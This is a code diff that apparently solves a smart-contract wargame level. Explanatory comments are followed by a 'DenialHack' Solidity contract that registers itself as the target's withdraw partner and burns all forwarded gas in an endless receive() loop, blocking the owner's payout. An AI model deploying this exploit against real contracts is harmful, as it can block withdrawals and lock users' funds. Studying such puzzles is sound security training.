@@ -52,3 +52,20 @@ contract Hack {
 }
 
 // set the contract address as a partner
+
+// An interesting fact about the call() function is that it forwards all the gas along with the call unless a gas value is specified in the call. The transfer() and send() only forwards 2300 gas.
+
+// The call() returns two values, a bool success showing if the call succeeded and a bytes memory data which contains the return value. It should be noted that the return values of the external calls are not checked anywhere.
+
+// To exploit the contract and prevent the owner.transfer(amountToSend) from being called, we need to create a contract with a fallback or receive function that drains all the gas and prevents further execution of the withdraw() function.
+
+contract DenialHack {
+
+    constructor(address payable _target) public {
+        Denial(_target).setWithdrawPartner(address(this));
+    }
+
+    receive() external payable {
+        while (true) {}
+    }
+}
